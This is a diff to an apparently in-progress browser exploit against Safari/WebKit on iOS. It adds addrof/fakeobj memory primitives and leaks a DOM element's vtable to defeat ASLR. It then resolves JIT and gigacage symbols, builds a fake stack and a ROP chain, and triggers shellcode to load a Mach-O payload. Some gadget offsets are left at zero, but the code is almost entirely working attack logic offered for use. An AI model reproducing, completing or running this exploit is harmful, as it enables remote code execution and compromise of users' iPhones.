@@ -2,6 +2,9 @@ using('liblogging');
 using('libint64');
 using('libbinhelper');
 
+// Length of our shellcode
+var shellcode_length = 0;
+
 // Exported offsets global
 _off = {};
 
@@ -561,7 +564,22 @@ var stage1 = function()
     var wasmBufferRawAddr = primitives.addrof(wasmBuffer);
     var wasmBufferAddr = Add(Int64.fromDouble(wasmBufferRawAddr), 16);
     print("[+] Fake Wasm Memory @ " + wasmBufferAddr);
-
+    var alreadyHacked = function(){
+    	var p = wasmBufferAddr.toString().split();
+    	if(p[2]+p[3]+p[4] == '41f') //0 and 1 are 0x, so we skip these bits
+    	{
+    		return true;
+    	}
+    	else 
+    	{
+    		return false;
+    	}
+    }();
+    if(alreadyHacked)
+    {
+    	print("[+] Detected leftover from previous exploit, page will be refreshed.");
+    	window.location.reload();
+    }
     var fakeWasmBuffer = primitives.fakeobj(wasmBufferAddr.asDouble());
     
     while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
@@ -702,6 +720,18 @@ var stage1 = function()
         var writer = primitives.create_writer(addrObj);
         writer.write_i64(offset, value);
     };
+
+    primitives.write_non_zero = function(where, values)
+    {
+    	for(var i = 0; i < values.length; ++i)
+    	{
+    		if(values[i] != 0)
+    		{
+    			primitives.write_i64(where + i * 8, 0, values[i]);
+    		}
+    	}
+    };
+
     primitives.read_i32 = function(addrObj, offset) {
         var writer = primitives.create_writer(addrObj);
         return new Int64(writer.read_i32(offset));
@@ -799,20 +829,29 @@ var stage2 = function()
 
 	var shf = getjitfunc(); //At this point, our payload should have been executed. (But not today as it is unfinished work).
 
+	// This element is the element we target for leaking randomization and execution
 	var wrapper = document.createElement('div');
 	var el = primitives.read_i64(wrapper, FPO);
     print("Element @ 0x" + el);
 
+    // We will leak the vtable of the element so that we can calculate the shared cache randomization slide
     var vtable = primitives.read_i64(el, 0);
     print("[+] Got vtable @ "+vtable);
 
+    // We can determine the address space randomization slide by simply diffing vtable offset against leaked vtable
     var slide = vtable - _off.elvtable;
     print("[+] Slide: "+ hexify(slide));
     dyld_cache_slide(vtable, _off.elvtable);
 
-    var jitWriteSeparateHeapsFunction = primitives.read_i64(slideaddr(_off.jit_writeseperateheaps_func));
-    var useFastPermisionsJITCopy = primitives.read_i64(slideaddr(_off.usefastpermissions_jitcopy));
+    // iOS devices with a processor pre-A12 use jitWriteSeperateHeapsFunction in the special jitMemCpy
+    var jitWriteSeparateHeapsFunctionAddr = slideaddr(_off.jit_writeseperateheaps_func);
+    var jitWriteSeparateHeapsFunction =primitives.read_i64(jitWriteSeparateHeapsFunctionAddr);
 
+    // iOS devices with a A12 processor and newer use useFastPermissionsJITCopy in the special jitMemCpy
+    var useFastPermisionsJITCopyAddr = slideaddr(_off.usefastpermissions_jitcopy);
+    var useFastPermisionsJITCopy = primitives.read_i64(useFastPermisionsJITCopyAddr);
+
+    // We will determine which of the jitMemCpy methods is enforced
     if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) 
     {
     	print("[+] Got an older device. We can use the legacy execution flow.");
@@ -822,15 +861,158 @@ var stage2 = function()
     	print("[+] Got an iPhone 8 or up. We must use the modern execution flow.");
     }
 
-	var buffer_addr = primitives.addrof(u32_buffer); // Is this poisoned or am I stupid?
+    // We want to jitMemCpy our shellcode into the executable memorypool
+    // As probably on iOS 12 the symbols are removed and we can't leak the pool using offsets anymore we need to leak it through instances
+    var startOfFixedExecutableMemoryPool = 0;
+    var endOfFixedExecutableMemoryPool = 0;
+
+    var jscbase = slideaddr(_off.jscbase);
+
+    // These offsets are needed for our ROP based mach-o loader and jitMemCpy
+    var disablePrimitiveGigacage = slideaddr(_off.disableprimitivegigacage);
+    var callbacks = slideaddr(_off.callbacks);
+   
+    var g_gigacageBasePtrs = slideaddr(_off.g_gigacagebaseptrs);
+    var g_typedArrayPoisons = 0;
+    var longjmp = slideaddr(_off.longjmp);
+    var dlsym = slideaddr(_off.dlsym);
+    var ptr_stack_chk_guard = slideaddr(_off.ptr_stack_check_guard);
+
+
+    print("[+] Finding the callback vector");
+    var callback_vector = 0;
+    if(callbacks)
+    {
+    	callbacks = primitives.read_i64(callbacks, 0);
+    }
+    
+    print("[+] Finding array poison value");
+    var poison = 0;
+    if(g_typedArrayPoisons)
+    {
+    	poison = primitives.read_i64(g_typedArrayPoisons, 48);
+    }
+
+    print(''
+        + '\nASLR Slide ' + hexify(slide) //dyld shared cache slide should be equal to the vtable infoleak minus the vtable offset
+        + '\nJavaScriptCore base @ ' + (jscbase == slide ? "Offset missing" : hexify(jscbase))
+        + '\ncallbacks @ ' + (callbacks == slide ? "Offset missing" : hexify(callbacks)) //callback vector
+        + '\nlongjmp @ ' + (longjmp == slide ? "Offset missing" : hexify(longjmp)) //symbol
+        + '\ndlsym @ ' + (dlsym == slide ? "Offset missing" : hexify(dlsym)) //dlsym symbol, used for referincing a symbol by string
+        + '\ndisablePrimitiveGigacage @ ' + (disablePrimitiveGigacage == slide ? "Offset missing" : hexify(disablePrimitiveGigacage)) //symbol
+        + '\ng_gigacageBasePtrs @ ' + (g_gigacageBasePtrs == slide ? "Offset missing" : hexify(g_gigacageBasePtrs)) //symbol
+        + '\nlinkCode gadget @ ' + (linkcode_gadget == slide ? "Offset missing" : hexify(linkcode_gadget)) //symbol, used in stage2
+        + '\njit_writeseperateheaps_func @ ' + (jitWriteSeparateHeapsFunctionAddr == slide ? "Offset missing" : hexify(jitWriteSeparateHeapsFunctionAddr))
+        + '\nuseFastPermisionsJITCopy @ ' +  (useFastPermisionsJITCopyAddr == slide ? "Offset missing" : hexify(useFastPermisionsJITCopyAddr))
+        + '\nstartfixedmempool @ ' + (startOfFixedExecutableMemoryPool == slide ? "Offset missing" : hexify(startOfFixedExecutableMemoryPool))
+        + '\nendfixedmempool @ ' + (endOfFixedExecutableMemoryPool == slide ? "Offset missing" : hexify(endOfFixedExecutableMemoryPool))
+        + '\nptr_stack_check_guard @ ' + (ptr_stack_chk_guard == slide ? "Offset missing" : hexify(ptr_stack_chk_guard))
+    );
+
+   	// These rop gadget offsets are used for our ROP based mach-o loader but can ofcourse be altered.
+	// This gadget is used so that we can get control over stack and fake stack memory
+
+	// ModelIO:0x000000018d2f6564 :
+    //   ldr x8, [sp, #0x28]
+    //   ldr x0, [x8, #0x18]
+    //   ldp x29, x30, [sp, #0x50]
+    //   add sp, sp, #0x60
+    //   ret
+   	var pop_x8 = 0;
+
+   	// CoreAudio:0x000000018409ddbc
+    //   ldr x2, [sp, #8]
+    //   mov x0, x2
+    //   ldp x29, x30, [sp, #0x10]
+    //   add sp, sp, #0x20
+    //   ret
+    var pop_x2 = 0;
+
+    // see jitcode.s (stage3)
+    // This gadget is basically for loading our mach-o
+    // It is used in logic where the loader mimics as if dyld was invoked from kernel
+    // However, stage3 by Luca Todesco is officially closed-source
+    var linkcode_gadget = 0;
+
+    var buffer_addr = primitives.addrof(u32_buffer); // Is this poisoned or am I stupid?
     print("[+] Shellcode buffer @ " +buffer_addr);
 
+    var shellcode_src = Add(buffer_addr,0x4000);
+    print("[+] Shellcode @ " + shellcode_src);
+
+    var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000;
+    print("[+] Shellcode target @ " + shellcode_dst);
+
+    // Verify that we would actually end up in the executable memorypool.
+   	if(shellcode_dst < startOfFixedExecutableMemoryPool) 
+   	{
+   		throw "We can't target any address that is not in the executable memorypool";
+   	}
+
+    // We need to write dlsym offset at the begin of our shellcode
+    // This is to make sure our mach-o will get loaded by dyld
+	print("[+] Preparing shellcode with dlsym offset.");
+    primitives.write_i64(shellcode_src, 4, dlsym);
+
+    print("[+] Creating fake stack.");
+    var fake_stack = [
+    	0,
+    	shellcode_length, // x2
+    	0,
+
+    	pop_x8,
+
+    	0, 0, 0, 0, 0,
+    	shellcode_dst, // x8
+    	0, 0, 0, 0,
+    	primitives.read_i64(ptr_stack_chk_guard) + 0x58,
+    	
+    	linkcode_gadget,
+    	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+
+        shellcode_dst,
+
+    ];
+
+	// Set up vtable at offset 0
+    print("[+] Setting up fake vtable.");
+    u32_buffer[0] = longjmp % BASE32;
+    u32_buffer[1] = longjmp / BASE32;
+
+    // Set up the fake stack at offset 0x2000
+    print("[+] Setting up fake stack in buffer");
+    for(var i = 0; i < fake_stack.length; ++i)
+    {
+    	u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32
+        u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32
+    }
+
+    // We will now write our final chain to the element
+	print("[+] Writing ropchain to the element.");
+    primitives.write_non_zero(el, [
+    	buffer_addr, //fake vtable
+    	0,
+    	shellcode_src, // x21
+    	0, 0, 0, 0, 0, 0, 0,
+        0, // frame pointer
+        pop_x2, // linking register
+        0,
+        buffer_addr + 0x2000, // stack pointer (will point to our fake stack)
+    ]);
+
+    print('[+] Executing our shellcode.');
+    millis(100);
+    wrapper.addEventListener('click', function(){});
+
+    /*
     print('[+] Replacing executable region address...');
     primitives.write_i64(shf[1], 4, buffer_addr);
 
     print("[+] Jumping pc...");
  	millis(100);
     shf[0]();
+    */
 };
 
 var pwn = function()
@@ -844,7 +1026,10 @@ var pwn = function()
 	}
 	catch(ex)
 	{
-		print(ex.message+'\n'+ex.stack);
+		if(ex.message && ex.stack)
+		{
+			print(ex.message+'\n'+ex.stack);
+		}
 	}
 };
 
@@ -880,7 +1065,7 @@ var wk1211go = function()
 
             print("Shellcode has been received, checking validity.");
             
-            var shellcode_length = buffer.byteLength;
+            shellcode_length = buffer.byteLength;
             if(shellcode_length > CONFIG.PAYLOAD.MAX_SIZE) throw "Shellcode exceeds maximum size";
             print("Received "+shellcode_length+" bytes of shellcode "+ (local ? "from persistent storage." : "."), true);
             if(!local) pwr.writeto('shellcode',new TextDecoder().decode(buffer));
